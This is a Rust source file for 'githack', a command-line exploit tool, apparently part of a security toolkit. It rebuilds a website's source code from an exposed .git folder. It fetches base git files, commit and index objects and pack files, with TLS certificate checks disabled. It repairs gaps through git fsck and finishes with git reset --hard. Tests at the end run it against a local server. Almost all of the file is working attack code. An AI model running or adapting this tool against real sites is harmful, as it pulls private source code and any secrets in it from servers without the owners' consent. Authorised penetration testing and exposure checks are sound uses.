//! @alias: gh
//! @about: A .git folder disclosure exploit tool

use anyhow::Result;
use clap::Parser;
use indicatif::{ProgressBar, ProgressStyle};
use std::collections::HashSet;
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Read as _};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tracing::{debug, info, warn};

use enyo_core::Action;

lazy_static::lazy_static! {
    static ref SHA1_RE: regex::Regex = regex::Regex::new(r"([a-fA-F0-9]{40})").unwrap();
}

const ZERO_HASH: &str = "0000000000000000000000000000000000000000";

/// Base git files to fetch
const BASE_FILES: &[&str] = &[
    ".git/ORIG_HEAD",
    ".git/config",
    ".git/HEAD",
    ".git/info/exclude",
    ".git/info/packs",
    ".git/logs/HEAD",
    ".git/logs/refs/heads/master",
    ".git/logs/refs/heads/main",
    ".git/logs/refs/stash",
    ".git/description",
    ".git/refs/heads/master",
    ".git/refs/heads/main",
    ".git/refs/stash",
    ".git/index",
    ".git/COMMIT_EDITMSG",
    ".git/objects/info/packs",
];

/// A .git folder disclosure exploit tool
#[derive(Debug, Parser)]
#[clap(name = "githack")]
pub struct Cmd {
    /// Target URL
    #[arg()]
    pub target: String,

    /// Request limit (concurrent)
    #[arg(short, long, default_value = "10")]
    pub limit: usize,

    /// Request delay (ms)
    #[arg(short, long, default_value = "0")]
    pub delay: u64,

    /// Request timeout (s)
    #[arg(short = 'T', long, default_value = "10")]
    pub timeout: u64,
}

#[async_trait::async_trait]
impl Action for Cmd {
    async fn execute(&self) -> Result<()> {
        git_hack(&self.target, self.limit, self.delay, self.timeout).await
    }
}

/// Parse URL and create output directory path
fn parse_url(target_url: &str) -> Result<(String, PathBuf)> {
    let url = url::Url::parse(target_url)?;
    let host = url.host_str().unwrap_or("unknown");
    let port_part = url.port().map(|p| format!("_{p}")).unwrap_or_default();
    let path_part = url
        .path()
        .trim_start_matches('/')
        .trim_end_matches(".git/")
        .trim_end_matches(".git")
        .trim_end_matches('/');

    let mut dir_name = format!("{host}{port_part}");
    if !path_part.is_empty() {
        dir_name.push('_');
        dir_name.push_str(path_part);
    }
    // Replace bad characters
    for bad in &['.', '/', '\\', '\'', '"', ':'] {
        dir_name = dir_name.replace(*bad, "_");
    }

    let base_url = target_url
        .trim_end_matches(".git/")
        .trim_end_matches(".git")
        .trim_end_matches('/');

    Ok((base_url.to_string(), PathBuf::from(&dir_name)))
}

/// Downloader struct to handle concurrent downloads
struct Downloader {
    client: reqwest::Client,
    semaphore: Arc<Semaphore>,
    delay_ms: u64,
}

impl Downloader {
    fn new(limit: usize, timeout_secs: u64, delay_ms: u64) -> Self {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(timeout_secs))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_default();

        Self {
            client,
            semaphore: Arc::new(Semaphore::new(limit)),
            delay_ms,
        }
    }

    async fn download_batch(
        &self,
        tasks: Vec<(String, PathBuf)>,
        pb: Option<&ProgressBar>,
    ) -> Result<usize> {
        let mut handles = Vec::new();

        for (url, dest) in tasks {
            let client = self.client.clone();
            let sem = self.semaphore.clone();
            let delay = self.delay_ms;

            handles.push(tokio::spawn(async move {
                let _permit = sem.acquire().await.ok()?;

                if delay > 0 {
                    tokio::time::sleep(std::time::Duration::from_millis(delay)).await;
                }

                debug!("Downloading: {}", url);

                let response = client.get(&url).send().await.ok()?;
                if !response.status().is_success() {
                    return None;
                }

                let bytes = response.bytes().await.ok()?;
                if bytes.is_empty() {
                    return None;
                }

                if let Some(parent) = dest.parent() {
                    fs::create_dir_all(parent).ok()?;
                }

                fs::write(&dest, bytes).ok()?;
                Some(())
            }));
        }

        let mut success_count = 0;
        for handle in handles {
            if let Ok(Some(())) = handle.await {
                success_count += 1;
            }
            if let Some(pb) = pb {
                pb.inc(1);
            }
        }

        Ok(success_count)
    }
}

/// Create a progress bar with consistent style
fn make_progress_bar(total: u64, prefix: &str) -> ProgressBar {
    let pb = ProgressBar::new(total);
    pb.set_style(
        ProgressStyle::default_bar()
            .template(&format!(
                "{{spinner:.green}} {prefix} [{{bar:30.cyan/blue}}] {{pos}}/{{len}} ({{percent}}%)"
            ))
            .unwrap()
            .progress_chars("█▓▒░"),
    );
    pb.enable_steady_tick(std::time::Duration::from_millis(100));
    pb
}

/// Read HEAD ref to determine actual branch name
fn read_head_ref(temp_dir: &Path) -> Option<String> {
    let head_path = temp_dir.join(".git/HEAD");
    let content = fs::read_to_string(&head_path).ok()?;
    let content = content.trim();
    // e.g. "ref: refs/heads/main"
    content
        .strip_prefix("ref: refs/heads/")
        .map(|s| s.to_string())
}

/// Collect hashes from a git log file
fn collect_hashes_from_log(log_path: &Path, hashes: &mut HashSet<String>) {
    let file = match File::open(log_path) {
        Ok(f) => f,
        Err(_) => return,
    };
    let reader = BufReader::new(file);

    for line in reader.lines() {
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 2 {
            continue;
        }
        // parts[0] = from hash, parts[1] = to hash
        for &hash in &[parts[0], parts[1]] {
            if hash.len() >= 40 && hash != ZERO_HASH {
                hashes.insert(hash[..40].to_string());
            }
        }
    }
}

/// Build object download tasks from a set of hashes
fn build_object_tasks(
    hashes: &HashSet<String>,
    base_url: &str,
    temp_dir: &Path,
) -> Vec<(String, PathBuf)> {
    let mut tasks = Vec::new();
    for hash in hashes {
        let target = format!(".git/objects/{}/{}", &hash[..2], &hash[2..40]);
        let dest = temp_dir.join(&target);
        if !dest.exists() {
            let url = format!("{base_url}/{target}");
            tasks.push((url, dest));
        }
    }
    tasks
}

/// Fetch git objects from all log files
async fn fetch_log_objects(downloader: &Downloader, base_url: &str, temp_dir: &Path) -> Result<()> {
    let mut hashes = HashSet::new();

    // Collect from HEAD log
    collect_hashes_from_log(&temp_dir.join(".git/logs/HEAD"), &mut hashes);

    // Collect from known branch logs
    for branch in &["master", "main"] {
        collect_hashes_from_log(
            &temp_dir.join(format!(".git/logs/refs/heads/{branch}")),
            &mut hashes,
        );
    }

    // Collect from dynamically detected branch
    if let Some(branch) = read_head_ref(temp_dir) {
        if branch != "master" && branch != "main" {
            // Fetch this branch's log and ref if not already in base files
            let extra_files = [
                format!(".git/logs/refs/heads/{branch}"),
                format!(".git/refs/heads/{branch}"),
            ];
            let extra_tasks: Vec<(String, PathBuf)> = extra_files
                .iter()
                .map(|f| (format!("{base_url}/{f}"), temp_dir.join(f)))
                .filter(|(_, dest)| !dest.exists())
                .collect();
            if !extra_tasks.is_empty() {
                downloader.download_batch(extra_tasks, None).await?;
            }
            collect_hashes_from_log(
                &temp_dir.join(format!(".git/logs/refs/heads/{branch}")),
                &mut hashes,
            );
        }
    }

    // Collect from stash
    collect_hashes_from_log(&temp_dir.join(".git/logs/refs/stash"), &mut hashes);

    if hashes.is_empty() {
        return Ok(());
    }

    let tasks = build_object_tasks(&hashes, base_url, temp_dir);
    if !tasks.is_empty() {
        let pb = make_progress_bar(tasks.len() as u64, "Commit Objects");
        let count = downloader.download_batch(tasks, Some(&pb)).await?;
        pb.finish_and_clear();
        info!("Downloaded {} commit objects", count);
    }

    Ok(())
}

/// Parse git index binary file to extract object SHA1 hashes
fn parse_git_index(temp_dir: &Path) -> HashSet<String> {
    let mut hashes = HashSet::new();
    let index_path = temp_dir.join(".git/index");

    let mut file = match File::open(&index_path) {
        Ok(f) => f,
        Err(_) => return hashes,
    };

    let mut data = Vec::new();
    if file.read_to_end(&mut data).is_err() {
        return hashes;
    }

    // Git index format:
    // 4 bytes: "DIRC" signature
    // 4 bytes: version (big-endian u32, usually 2, 3, or 4)
    // 4 bytes: number of entries (big-endian u32)
    if data.len() < 12 {
        return hashes;
    }

    if &data[..4] != b"DIRC" {
        debug!("Invalid git index signature");
        return hashes;
    }

    let version = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
    let num_entries = u32::from_be_bytes([data[8], data[9], data[10], data[11]]);

    debug!("Git index version: {}, entries: {}", version, num_entries);

    let mut offset = 12;
    for _ in 0..num_entries {
        // Each entry (version 2/3):
        // 40 bytes of stat info (ctime, mtime, dev, ino, mode, uid, gid, size)
        // 20 bytes SHA1
        // 2 bytes flags
        // variable length name (null-padded to multiple of 8 from entry start)
        if offset + 62 > data.len() {
            break;
        }

        let sha1_start = offset + 40;
        let sha1_end = sha1_start + 20;
        if sha1_end > data.len() {
            break;
        }

        let sha1 = hex::encode(&data[sha1_start..sha1_end]);
        if sha1 != ZERO_HASH {
            hashes.insert(sha1);
        }

        // Flags at offset+60, 2 bytes
        let flags = u16::from_be_bytes([data[offset + 60], data[offset + 61]]);
        let name_len = (flags & 0x0FFF) as usize;

        // Entry header is 62 bytes, then name bytes
        let entry_start = offset;
        let name_end = offset + 62 + name_len;

        // Entries are padded to a multiple of 8 bytes (from entry start)
        let entry_len = name_end - entry_start;
        let padded_len = (entry_len + 8) & !7;

        // Version 3/4 may have extra flags (2 bytes) if flag bit 0x4000 is set
        if version >= 3 && (flags & 0x4000) != 0 {
            offset = entry_start + padded_len + 2;
        } else {
            offset = entry_start + padded_len;
        }
    }

    debug!("Parsed {} hashes from git index", hashes.len());
    hashes
}

/// Fetch objects discovered from git index
async fn fetch_index_objects(
    downloader: &Downloader,
    base_url: &str,
    temp_dir: &Path,
) -> Result<()> {
    let hashes = parse_git_index(temp_dir);
    if hashes.is_empty() {
        return Ok(());
    }

    let tasks = build_object_tasks(&hashes, base_url, temp_dir);
    if !tasks.is_empty() {
        let pb = make_progress_bar(tasks.len() as u64, "Index Objects");
        let count = downloader.download_batch(tasks, Some(&pb)).await?;
        pb.finish_and_clear();
        info!("Downloaded {} index objects", count);
    }

    Ok(())
}

/// Fetch pack files listed in .git/objects/info/packs
async fn fetch_pack_files(downloader: &Downloader, base_url: &str, temp_dir: &Path) -> Result<()> {
    let packs_path = temp_dir.join(".git/objects/info/packs");
    let content = match fs::read_to_string(&packs_path) {
        Ok(c) => c,
        Err(_) => return Ok(()),
    };

    let mut tasks = Vec::new();
    for line in content.lines() {
        let line = line.trim();
        // Lines like "P pack-<hash>.pack"
        if let Some(pack_name) = line.strip_prefix("P ") {
            let pack_name = pack_name.trim();
            // Download .pack and .idx files
            let idx_name = pack_name.replace(".pack", ".idx");
            for name in &[pack_name, idx_name.as_str()] {
                let target = format!(".git/objects/pack/{name}");
                let dest = temp_dir.join(&target);
                if !dest.exists() {
                    let url = format!("{base_url}/{target}");
                    tasks.push((url, dest));
                }
            }
        }
    }

    if !tasks.is_empty() {
        let pb = make_progress_bar(tasks.len() as u64, "Pack Files");
        let count = downloader.download_batch(tasks, Some(&pb)).await?;
        pb.finish_and_clear();
        info!("Downloaded {} pack files", count);
    }

    Ok(())
}

/// Fix missing git objects by running git fsck
async fn fix_missing_objects(
    downloader: &Downloader,
    base_url: &str,
    temp_dir: &Path,
) -> Result<()> {
    let output = Command::new("git")
        .arg("fsck")
        .current_dir(temp_dir)
        .output();

    let output = match output {
        Ok(o) => o,
        Err(e) => {
            warn!("Failed to run git fsck: {}", e);
            return Ok(());
        }
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");

    debug!("git fsck output: {}", combined);

    let mut hashes = HashSet::new();
    for cap in SHA1_RE.captures_iter(&combined) {
        let hash = cap[1].to_string();
        if hash != ZERO_HASH {
            hashes.insert(hash);
        }
    }

    if hashes.is_empty() {
        return Ok(());
    }

    let tasks = build_object_tasks(&hashes, base_url, temp_dir);
    if !tasks.is_empty() {
        let pb = make_progress_bar(tasks.len() as u64, "Missing Objects");
        let count = downloader.download_batch(tasks, Some(&pb)).await?;
        pb.finish_and_clear();
        info!("Downloaded {} missing objects", count);
        // Recursively fix missing objects
        Box::pin(fix_missing_objects(downloader, base_url, temp_dir)).await?;
    }

    Ok(())
}

/// Main git hack function
async fn git_hack(target_url: &str, limit: usize, delay: u64, timeout: u64) -> Result<()> {
    info!("Attack Target: {}", target_url);

    let (base_url, temp_dir) = parse_url(target_url)?;
    info!("BaseURL: {}", base_url);
    info!("TempDir: {}", temp_dir.display());

    let downloader = Downloader::new(limit, timeout, delay);

    // 1. Fetch base files
    info!("Fetch Base Files...");
    let base_tasks: Vec<(String, PathBuf)> = BASE_FILES
        .iter()
        .map(|f| {
            let url = format!("{base_url}/{f}");
            let dest = temp_dir.join(f);
            (url, dest)
        })
        .collect();

    let pb = make_progress_bar(base_tasks.len() as u64, "Base Files");
    let count = downloader.download_batch(base_tasks, Some(&pb)).await?;
    pb.finish_and_clear();
    info!("Downloaded {} base files", count);

    // 2. Fetch commit objects from all logs
    info!("Fetch Commit Objects...");
    fetch_log_objects(&downloader, &base_url, &temp_dir).await?;

    // 3. Fetch objects from git index
    info!("Fetch Index Objects...");
    fetch_index_objects(&downloader, &base_url, &temp_dir).await?;

    // 4. Fetch pack files
    info!("Fetch Pack Files...");
    fetch_pack_files(&downloader, &base_url, &temp_dir).await?;

    // 5. Fix missing objects via git fsck
    info!("Fetch Missing Objects...");
    fix_missing_objects(&downloader, &base_url, &temp_dir).await?;

    // 6. Git reset to restore files
    info!("Git Reset...");
    let output = Command::new("git")
        .args(["reset", "--hard"])
        .current_dir(&temp_dir)
        .output();

    match output {
        Ok(o) => {
            if !o.status.success() {
                let stderr = String::from_utf8_lossy(&o.stderr);
                warn!("git reset failed: {}", stderr);
            }
        }
        Err(e) => {
            warn!("Failed to run git reset: {}", e);
        }
    }

    info!("Fetched Info Complete!");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::SocketAddr;
    use tempfile::TempDir;
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    use tokio::net::TcpListener;

    #[test]
    fn test_parse_url() {
        let (base, dir) = parse_url("http://example.com/.git/").unwrap();
        assert_eq!(base, "http://example.com");
        assert_eq!(dir.to_str().unwrap(), "example_com");
    }

    #[test]
    fn test_parse_url_with_path() {
        let (base, dir) = parse_url("http://example.com/path/.git/").unwrap();
        assert_eq!(base, "http://example.com/path");
        assert_eq!(dir.to_str().unwrap(), "example_com_path");
    }

    #[test]
    fn test_parse_url_with_port() {
        let (base, dir) = parse_url("http://example.com:8080/.git/").unwrap();
        assert_eq!(base, "http://example.com:8080");
        assert_eq!(dir.to_str().unwrap(), "example_com_8080");
    }

    #[test]
    fn test_parse_url_bare() {
        let (base, _) = parse_url("http://example.com/").unwrap();
        assert_eq!(base, "http://example.com");
    }

    #[test]
    fn test_parse_git_index_empty() {
        let dir = PathBuf::from("/nonexistent");
        let hashes = parse_git_index(&dir);
        assert!(hashes.is_empty());
    }

    #[test]
    fn test_collect_hashes_from_log_missing() {
        let mut hashes = HashSet::new();
        collect_hashes_from_log(Path::new("/nonexistent/log"), &mut hashes);
        assert!(hashes.is_empty());
    }

    #[test]
    fn test_sha1_regex() {
        let text = "missing blob abc123def456789012345678901234567890abcd";
        let caps: Vec<_> = SHA1_RE.captures_iter(text).collect();
        assert_eq!(caps.len(), 1);
        assert_eq!(&caps[0][1], "abc123def456789012345678901234567890abcd");
    }

    /// Initialize a git repo with commits and stash in a temp directory
    fn init_git_repo(repo_dir: &Path) -> Result<()> {
        let run = |args: &[&str]| -> Result<()> {
            let output = Command::new("git")
                .args(["-c", "commit.gpgsign=false"])
                .args(args)
                .current_dir(repo_dir)
                .env("GIT_AUTHOR_NAME", "Test")
                .env("GIT_AUTHOR_EMAIL", "test@test.com")
                .env("GIT_COMMITTER_NAME", "Test")
                .env("GIT_COMMITTER_EMAIL", "test@test.com")
                .output()?;
            if !output.status.success() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                anyhow::bail!("git {:?} failed: {}", args, stderr);
            }
            Ok(())
        };

        run(&["init", "-b", "main"])?;

        // First commit
        fs::write(repo_dir.join("hello.txt"), "Hello, world!\n")?;
        run(&["add", "hello.txt"])?;
        run(&["commit", "-m", "Initial commit"])?;

        // Second commit
        fs::write(repo_dir.join("foo.txt"), "Foo content\n")?;
        fs::create_dir_all(repo_dir.join("subdir"))?;
        fs::write(repo_dir.join("subdir/bar.txt"), "Bar content\n")?;
        run(&["add", "."])?;
        run(&["commit", "-m", "Add foo and bar"])?;

        // Stash
        fs::write(repo_dir.join("stashed.txt"), "Stashed content\n")?;
        run(&["add", "stashed.txt"])?;
        run(&["stash", "push", "-m", "test stash"])?;

        Ok(())
    }

    /// Start a minimal HTTP static file server serving files from `root`
    async fn start_file_server(root: PathBuf) -> Result<(SocketAddr, tokio::task::JoinHandle<()>)> {
        let listener = TcpListener::bind("127.0.0.1:0").await?;
        let addr = listener.local_addr()?;

        let handle = tokio::spawn(async move {
            loop {
                let (stream, _) = match listener.accept().await {
                    Ok(v) => v,
                    Err(_) => break,
                };
                let root = root.clone();
                tokio::spawn(async move {
                    let (reader, mut writer) = stream.into_split();
                    let mut buf_reader = BufReader::new(reader);
                    let mut request_line = String::new();
                    if buf_reader.read_line(&mut request_line).await.is_err() {
                        return;
                    }
                    // Drain remaining headers
                    loop {
                        let mut line = String::new();
                        match buf_reader.read_line(&mut line).await {
                            Ok(0) | Err(_) => break,
                            Ok(_) => {
                                if line.trim().is_empty() {
                                    break;
                                }
                            }
                        }
                    }

                    // Parse "GET /path HTTP/1.x"
                    let path = request_line
                        .split_whitespace()
                        .nth(1)
                        .unwrap_or("/")
                        .trim_start_matches('/');

                    let file_path = root.join(path);
                    let response = if file_path.is_file() {
                        match fs::read(&file_path) {
                            Ok(data) => {
                                format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n", data.len())
                                    .into_bytes()
                                    .into_iter()
                                    .chain(data)
                                    .collect::<Vec<u8>>()
                            }
                            Err(_) => b"HTTP/1.1 500 Internal Server Error\r\n\r\n".to_vec(),
                        }
                    } else {
                        b"HTTP/1.1 404 Not Found\r\n\r\n".to_vec()
                    };

                    let _ = writer.write_all(&response).await;
                    let _ = writer.shutdown().await;
                });
            }
        });

        Ok((addr, handle))
    }

    #[test]
    fn test_parse_git_index_real() {
        let repo_dir = TempDir::new().unwrap();
        init_git_repo(repo_dir.path()).unwrap();

        let hashes = parse_git_index(repo_dir.path());
        // After 2 commits with 3 files (hello.txt, foo.txt, subdir/bar.txt)
        // stash pop restores working tree, index should have these files
        assert!(
            !hashes.is_empty(),
            "Should parse at least one hash from git index"
        );
    }

    #[test]
    fn test_collect_hashes_from_real_log() {
        let repo_dir = TempDir::new().unwrap();
        init_git_repo(repo_dir.path()).unwrap();

        let mut hashes = HashSet::new();
        collect_hashes_from_log(
            &repo_dir.path().join(".git/logs/refs/heads/main"),
            &mut hashes,
        );
        // 2 commits => at least 2 hashes (initial has zero from-hash, skipped)
        assert!(
            hashes.len() >= 2,
            "Expected at least 2 hashes, got {}",
            hashes.len()
        );

        // Stash log should also have hashes
        let mut stash_hashes = HashSet::new();
        collect_hashes_from_log(
            &repo_dir.path().join(".git/logs/refs/stash"),
            &mut stash_hashes,
        );
        assert!(!stash_hashes.is_empty(), "Should have stash hashes");
    }

    #[test]
    fn test_read_head_ref_real() {
        let repo_dir = TempDir::new().unwrap();
        init_git_repo(repo_dir.path()).unwrap();

        let branch = read_head_ref(repo_dir.path());
        assert_eq!(branch, Some("main".to_string()));
    }

    #[tokio::test]
    async fn test_git_hack_integration() {
        // 1. Create source git repo
        let repo_dir = TempDir::new().unwrap();
        init_git_repo(repo_dir.path()).unwrap();

        // 2. Start HTTP server serving the repo directory
        let (addr, server_handle) = match start_file_server(repo_dir.path().to_path_buf()).await {
            Ok(server) => server,
            Err(e)
                if e.downcast_ref::<std::io::Error>()
                    .is_some_and(|e| e.kind() == std::io::ErrorKind::PermissionDenied) =>
            {
                return
            }
            Err(e) => panic!("failed to start test file server: {e}"),
        };

        // 3. Run git_hack in a temp working directory
        let work_dir = TempDir::new().unwrap();
        let original_dir = std::env::current_dir().unwrap();
        std::env::set_current_dir(work_dir.path()).unwrap();

        let target_url = format!("http://127.0.0.1:{}/.git/", addr.port());
        let result = git_hack(&target_url, 5, 0, 10).await;

        // Restore working directory before assertions
        std::env::set_current_dir(&original_dir).unwrap();

        // 4. Cleanup server
        server_handle.abort();

        // 5. Verify result
        assert!(result.is_ok(), "git_hack failed: {:?}", result.err());

        // The output directory is derived from URL: 127_0_0_1_<port>
        let output_dir = work_dir.path().join(format!("127_0_0_1_{}", addr.port()));

        // Verify .git directory was fetched
        assert!(
            output_dir.join(".git/HEAD").exists(),
            "HEAD should be fetched"
        );
        assert!(
            output_dir.join(".git/config").exists(),
            "config should be fetched"
        );

        // Verify git reset restored working tree files
        if output_dir.join("hello.txt").exists() {
            let content = fs::read_to_string(output_dir.join("hello.txt")).unwrap();
            assert_eq!(content, "Hello, world!\n");
        }
        if output_dir.join("foo.txt").exists() {
            let content = fs::read_to_string(output_dir.join("foo.txt")).unwrap();
            assert_eq!(content, "Foo content\n");
        }
        if output_dir.join("subdir/bar.txt").exists() {
            let content = fs::read_to_string(output_dir.join("subdir/bar.txt")).unwrap();
            assert_eq!(content, "Bar content\n");
        }
    }
}
